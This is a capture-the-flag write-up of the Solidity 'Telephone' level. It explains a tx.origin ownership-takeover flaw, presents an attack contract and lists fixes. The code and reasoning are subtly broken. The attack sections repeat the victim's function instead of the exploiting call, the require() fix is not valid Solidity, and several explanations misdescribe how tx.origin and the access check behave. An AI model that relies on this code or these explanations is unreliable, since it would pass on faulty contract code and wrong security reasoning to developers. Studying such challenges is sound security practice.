# Telephone challenge - Level 4

<p align="left"> <img src="https://komarev.com/ghpvc/?username=Level4&label=Repository%20views&color=0e75b6&style=flat" alt="wrappedusername" /> </p>


```yml
This smart contract has a vulnerability, because:
```

- by checking tx.origin, it gets the original address that kicked off the transaction, which is still the owner address.
  - so passing the if() statement is extremely easy to become the new owner!

```Solidity

function changeOwner(address _owner) public {
  if (tx.origin != msg.sender) { // <----- tx.origin for authorization, and the if() will never revert if false
    owner = _owner;
  }
}
```

## 🆘 The victim contract in detail

```yml
The victim contract:
```
- There is not much here, meaning it could use OpenZeppelin's Ownable contract,

```Solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Telephone {

  address public owner;

  constructor() {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}
```

## ⚠️ The vulnerability in detail

```yml
The vulnerability:
```

- There are no access controls in place, to safe-guard access to this function,

```Solidity
 function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
```

## 💥 The attack contract in detail

```yml 
The attack contract starts with importing the victim contract:
```
- this will be used in the attack contract's constructor,

```Solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.6.0;

import "./Telephone.sol";

contract TelephoneHack {
```

- the constructor receives the victim contract address from the player and references the victim contract with Telephone(_address), this address is assigned as the state variable telContract,

```Solidity

Telephone telContract;

    constructor(address _address) public {
        telContract = Telephone(_address);
    }
```
- This function lacks proper access controls,

```Solidity

function changeOwner(address _owner) public {
  if (tx.origin != msg.sender) {
    owner = _owner;
  }
}
```

## 💥 The attack in detail

```yml
The attack:
```

- finally the attack begins,
- if msg.sender is not tx.origin address _owner will equal owner,
  - the player calls the changeOwner function to assume ownership and win.

```Solidity
/** 
* @notice function changeOwner() uses tx.origin to change ownership 
* to whatever address calls this function just as long as it is not the 
* address that started the original transaction that created this contract 
*/
function changeOwner(address _owner) public {
  if (tx.origin != msg.sender) {
    owner = _owner;
  }
}
```

## 💥 The attack contract locked and loaded in REMIX IDE

```yml
Click hackContract button to initiate the attack:
```

- lower left of the image, under the Deployed Contracts section 

<p align="left" >
<img width="512" height="512" src="https://user-images.githubusercontent.com/104662990/199756044-16a699f2-5111-4dfe-a25f-fac81cd4b1ab.png">
</P>

## 🩺 How can we fix this vulnerablity in the victim contract?

- we can use a require() statement for access control because,
- the require() statement will check msg.sender for authorization, but it will get the address of the attacking wallet, instead of the owner's address from tx.origin, so the transaction will automatically revert.

```Solidity
function changeOwner(address _owner) public {
  require(msg.sender == owner) { // <------ will revert transaction if false
  owner = _owner;
}
```

- ⚠️ Caution! Using an if() statement will accomplish the same thing as the require statement, but the if() statement will not automatically revert, you will need to use an if...else statement and manually revert the transaction 

```Solidity
function changeOwner(address newOwner) public {
  if (msg.sender == owner) {
    owner = newOwner;
  } else {
    revert("you are not the owner!") // <----- do not forget to revert the transaction!
  }
}
```

- we can also use access control with [OpenZeppelin's Ownable contract](https://docs.openzeppelin.com/contracts/4.x/access-control),
- this is all we need we have all of the same functionality of the victim contract without any of the vulnerabilities.

```Solidity
// SPDX-License-Identifier: MIT

pragma solidity 0.8.7;

import "@openzeppelin/contracts/access/Ownable.sol";

contract Telephone is Ownable {
  constructor()  {}
}

```

- in this image below I tried to change the owner of the contract but it reverted because of the access control from OpenZeppelin's Ownable contract.

![Screen Shot 2022-11-18 at 11 11 09 AM](https://user-images.githubusercontent.com/104662990/202762381-32fbb568-1f4a-4ee5-95ba-58ac9d27443c.png)


```yml
Ownable lets you:
```

- transferOwnership from the owner account to a new one, and

- renounceOwnership for the owner to relinquish this administrative privilege, a common pattern after an initial stage with centralized administration is over.

```yml
```

- In the code snippet below, is this too much security? 
- Maybe, the more code you write, the more attack surface may potentially be hidden, but present, because of one small error in your code.

```Solidity

function changeOwner(address newOwner) public {
  if (msg.sender == owner) {
    require(msg.sender == owner);
    owner = newOwner;
  } else {
    revert("you are not the owner!"); // <----- do not forget to revert the transaction!
  }
}

```




